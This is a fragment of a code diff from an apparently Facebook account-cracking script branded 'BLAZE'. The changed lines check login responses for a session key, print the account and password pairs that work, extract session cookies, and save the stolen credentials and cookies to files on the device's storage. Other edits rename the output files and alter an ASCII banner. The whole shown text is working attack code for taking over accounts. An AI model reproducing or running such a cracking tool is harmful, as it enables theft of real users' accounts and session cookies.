@@ -352,7 +352,7 @@ class __crack__:
     
 
 logo="""
---------------------------------------------------------
+
 |_   _ \ |_   _|       / \     |  __   _||_   __  | 
   | |_) |  | |         / _ \    |_/  / /    | |_ \_| 
   |  __'.  | |   _    / ___ \      .'.' _   |  _| _  
@@ -1031,7 +1031,7 @@ def method():
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'')
-                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -1040,7 +1040,7 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-OK.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/BLAZE-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
